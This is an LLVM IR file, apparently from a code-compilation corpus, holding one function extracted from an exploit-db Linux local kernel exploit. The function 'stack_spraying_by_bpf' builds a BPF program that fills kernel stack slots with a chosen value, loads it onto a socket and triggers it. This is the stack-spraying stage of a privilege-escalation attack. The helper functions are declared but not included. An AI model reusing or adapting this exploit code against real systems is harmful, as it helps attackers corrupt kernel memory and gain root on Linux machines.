; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_46006.c_stack_spraying_by_bpf.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_46006.c_stack_spraying_by_bpf.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.bpf_insn = type { i32 }

@BPF_REG_3 = common dso_local global i32 0, align 4
@BPF_REG_FP = common dso_local global i32 0, align 4
@BPF_ADD = common dso_local global i32 0, align 4
@BPF_DW = common dso_local global i32 0, align 4
@BPF_REG_0 = common dso_local global i32 0, align 4
@sockfds = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @stack_spraying_by_bpf(i64 %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca [23 x %struct.bpf_insn], align 16
  store i64 %0, i64* %2, align 8
  %5 = getelementptr inbounds [23 x %struct.bpf_insn], [23 x %struct.bpf_insn]* %4, i64 0, i64 0
  %6 = load i32, i32* @BPF_REG_3, align 4
  %7 = load i32, i32* @BPF_REG_FP, align 4
  %8 = call i32 @BPF_MOV64_REG(i32 %6, i32 %7)
  %9 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %5, i32 0, i32 0
  store i32 %8, i32* %9, align 4
  %10 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %5, i64 1
  %11 = load i32, i32* @BPF_ADD, align 4
  %12 = load i32, i32* @BPF_REG_3, align 4
  %13 = load i64, i64* %2, align 8
  %14 = sub i64 0, %13
  %15 = call i32 @BPF_ALU64_IMM(i32 %11, i32 %12, i64 %14)
  %16 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %10, i32 0, i32 0
  store i32 %15, i32* %16, align 4
  %17 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %10, i64 1
  %18 = load i32, i32* @BPF_DW, align 4
  %19 = load i32, i32* @BPF_REG_FP, align 4
  %20 = load i32, i32* @BPF_REG_3, align 4
  %21 = call i32 @BPF_STX_MEM(i32 %18, i32 %19, i32 %20, i32 -368)
  %22 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %17, i32 0, i32 0
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %17, i64 1
  %24 = load i32, i32* @BPF_DW, align 4
  %25 = load i32, i32* @BPF_REG_FP, align 4
  %26 = load i32, i32* @BPF_REG_3, align 4
  %27 = call i32 @BPF_STX_MEM(i32 %24, i32 %25, i32 %26, i32 -376)
  %28 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %23, i32 0, i32 0
  store i32 %27, i32* %28, align 4
  %29 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %23, i64 1
  %30 = load i32, i32* @BPF_DW, align 4
  %31 = load i32, i32* @BPF_REG_FP, align 4
  %32 = load i32, i32* @BPF_REG_3, align 4
  %33 = call i32 @BPF_STX_MEM(i32 %30, i32 %31, i32 %32, i32 -384)
  %34 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %29, i32 0, i32 0
  store i32 %33, i32* %34, align 4
  %35 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %29, i64 1
  %36 = load i32, i32* @BPF_DW, align 4
  %37 = load i32, i32* @BPF_REG_FP, align 4
  %38 = load i32, i32* @BPF_REG_3, align 4
  %39 = call i32 @BPF_STX_MEM(i32 %36, i32 %37, i32 %38, i32 -392)
  %40 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %35, i32 0, i32 0
  store i32 %39, i32* %40, align 4
  %41 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %35, i64 1
  %42 = load i32, i32* @BPF_DW, align 4
  %43 = load i32, i32* @BPF_REG_FP, align 4
  %44 = load i32, i32* @BPF_REG_3, align 4
  %45 = call i32 @BPF_STX_MEM(i32 %42, i32 %43, i32 %44, i32 -400)
  %46 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %41, i32 0, i32 0
  store i32 %45, i32* %46, align 4
  %47 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %41, i64 1
  %48 = load i32, i32* @BPF_DW, align 4
  %49 = load i32, i32* @BPF_REG_FP, align 4
  %50 = load i32, i32* @BPF_REG_3, align 4
  %51 = call i32 @BPF_STX_MEM(i32 %48, i32 %49, i32 %50, i32 -408)
  %52 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %47, i32 0, i32 0
  store i32 %51, i32* %52, align 4
  %53 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %47, i64 1
  %54 = load i32, i32* @BPF_DW, align 4
  %55 = load i32, i32* @BPF_REG_FP, align 4
  %56 = load i32, i32* @BPF_REG_3, align 4
  %57 = call i32 @BPF_STX_MEM(i32 %54, i32 %55, i32 %56, i32 -416)
  %58 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %53, i32 0, i32 0
  store i32 %57, i32* %58, align 4
  %59 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %53, i64 1
  %60 = load i32, i32* @BPF_DW, align 4
  %61 = load i32, i32* @BPF_REG_FP, align 4
  %62 = load i32, i32* @BPF_REG_3, align 4
  %63 = call i32 @BPF_STX_MEM(i32 %60, i32 %61, i32 %62, i32 -424)
  %64 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %59, i32 0, i32 0
  store i32 %63, i32* %64, align 4
  %65 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %59, i64 1
  %66 = load i32, i32* @BPF_DW, align 4
  %67 = load i32, i32* @BPF_REG_FP, align 4
  %68 = load i32, i32* @BPF_REG_3, align 4
  %69 = call i32 @BPF_STX_MEM(i32 %66, i32 %67, i32 %68, i32 -432)
  %70 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %65, i32 0, i32 0
  store i32 %69, i32* %70, align 4
  %71 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %65, i64 1
  %72 = load i32, i32* @BPF_DW, align 4
  %73 = load i32, i32* @BPF_REG_FP, align 4
  %74 = load i32, i32* @BPF_REG_3, align 4
  %75 = call i32 @BPF_STX_MEM(i32 %72, i32 %73, i32 %74, i32 -440)
  %76 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %71, i32 0, i32 0
  store i32 %75, i32* %76, align 4
  %77 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %71, i64 1
  %78 = load i32, i32* @BPF_DW, align 4
  %79 = load i32, i32* @BPF_REG_FP, align 4
  %80 = load i32, i32* @BPF_REG_3, align 4
  %81 = call i32 @BPF_STX_MEM(i32 %78, i32 %79, i32 %80, i32 -448)
  %82 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %77, i32 0, i32 0
  store i32 %81, i32* %82, align 4
  %83 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %77, i64 1
  %84 = load i32, i32* @BPF_DW, align 4
  %85 = load i32, i32* @BPF_REG_FP, align 4
  %86 = load i32, i32* @BPF_REG_3, align 4
  %87 = call i32 @BPF_STX_MEM(i32 %84, i32 %85, i32 %86, i32 -456)
  %88 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %83, i32 0, i32 0
  store i32 %87, i32* %88, align 4
  %89 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %83, i64 1
  %90 = load i32, i32* @BPF_DW, align 4
  %91 = load i32, i32* @BPF_REG_FP, align 4
  %92 = load i32, i32* @BPF_REG_3, align 4
  %93 = call i32 @BPF_STX_MEM(i32 %90, i32 %91, i32 %92, i32 -464)
  %94 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %89, i32 0, i32 0
  store i32 %93, i32* %94, align 4
  %95 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %89, i64 1
  %96 = load i32, i32* @BPF_DW, align 4
  %97 = load i32, i32* @BPF_REG_FP, align 4
  %98 = load i32, i32* @BPF_REG_3, align 4
  %99 = call i32 @BPF_STX_MEM(i32 %96, i32 %97, i32 %98, i32 -472)
  %100 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %95, i32 0, i32 0
  store i32 %99, i32* %100, align 4
  %101 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %95, i64 1
  %102 = load i32, i32* @BPF_DW, align 4
  %103 = load i32, i32* @BPF_REG_FP, align 4
  %104 = load i32, i32* @BPF_REG_3, align 4
  %105 = call i32 @BPF_STX_MEM(i32 %102, i32 %103, i32 %104, i32 -480)
  %106 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %101, i32 0, i32 0
  store i32 %105, i32* %106, align 4
  %107 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %101, i64 1
  %108 = load i32, i32* @BPF_DW, align 4
  %109 = load i32, i32* @BPF_REG_FP, align 4
  %110 = load i32, i32* @BPF_REG_3, align 4
  %111 = call i32 @BPF_STX_MEM(i32 %108, i32 %109, i32 %110, i32 -488)
  %112 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %107, i32 0, i32 0
  store i32 %111, i32* %112, align 4
  %113 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %107, i64 1
  %114 = load i32, i32* @BPF_DW, align 4
  %115 = load i32, i32* @BPF_REG_FP, align 4
  %116 = load i32, i32* @BPF_REG_3, align 4
  %117 = call i32 @BPF_STX_MEM(i32 %114, i32 %115, i32 %116, i32 -496)
  %118 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %113, i32 0, i32 0
  store i32 %117, i32* %118, align 4
  %119 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %113, i64 1
  %120 = load i32, i32* @BPF_DW, align 4
  %121 = load i32, i32* @BPF_REG_FP, align 4
  %122 = load i32, i32* @BPF_REG_3, align 4
  %123 = call i32 @BPF_STX_MEM(i32 %120, i32 %121, i32 %122, i32 -504)
  %124 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %119, i32 0, i32 0
  store i32 %123, i32* %124, align 4
  %125 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %119, i64 1
  %126 = load i32, i32* @BPF_DW, align 4
  %127 = load i32, i32* @BPF_REG_FP, align 4
  %128 = load i32, i32* @BPF_REG_3, align 4
  %129 = call i32 @BPF_STX_MEM(i32 %126, i32 %127, i32 %128, i32 -512)
  %130 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %125, i32 0, i32 0
  store i32 %129, i32* %130, align 4
  %131 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %125, i64 1
  %132 = load i32, i32* @BPF_REG_0, align 4
  %133 = call i32 @BPF_MOV64_IMM(i32 %132, i32 0)
  %134 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %131, i32 0, i32 0
  store i32 %133, i32* %134, align 4
  %135 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %131, i64 1
  %136 = call i32 (...) @BPF_EXIT_INSN()
  %137 = getelementptr inbounds %struct.bpf_insn, %struct.bpf_insn* %135, i32 0, i32 0
  store i32 %136, i32* %137, align 4
  %138 = getelementptr inbounds [23 x %struct.bpf_insn], [23 x %struct.bpf_insn]* %4, i64 0, i64 0
  %139 = getelementptr inbounds [23 x %struct.bpf_insn], [23 x %struct.bpf_insn]* %4, i64 0, i64 0
  %140 = call i32 @ARRSIZE(%struct.bpf_insn* %139)
  %141 = call i64 @create_filtered_socket_fd(%struct.bpf_insn* %138, i32 %140)
  store i64 %141, i64* @sockfds, align 8
  %142 = load i64, i64* @sockfds, align 8
  %143 = icmp slt i64 %142, 0
  br i1 %143, label %144, label %145

144:                                              ; preds = %1
  br label %150

145:                                              ; preds = %1
  %146 = load i64, i64* @sockfds, align 8
  %147 = call i32 @trigger_proc(i64 %146)
  %148 = load i64, i64* @sockfds, align 8
  %149 = call i32 @close(i64 %148)
  br label %150

150:                                              ; preds = %145, %144
  ret void
}

declare dso_local i32 @BPF_MOV64_REG(i32, i32) #1

declare dso_local i32 @BPF_ALU64_IMM(i32, i32, i64) #1

declare dso_local i32 @BPF_STX_MEM(i32, i32, i32, i32) #1

declare dso_local i32 @BPF_MOV64_IMM(i32, i32) #1

declare dso_local i32 @BPF_EXIT_INSN(...) #1

declare dso_local i64 @create_filtered_socket_fd(%struct.bpf_insn*, i32) #1

declare dso_local i32 @ARRSIZE(%struct.bpf_insn*) #1

declare dso_local i32 @trigger_proc(i64) #1

declare dso_local i32 @close(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
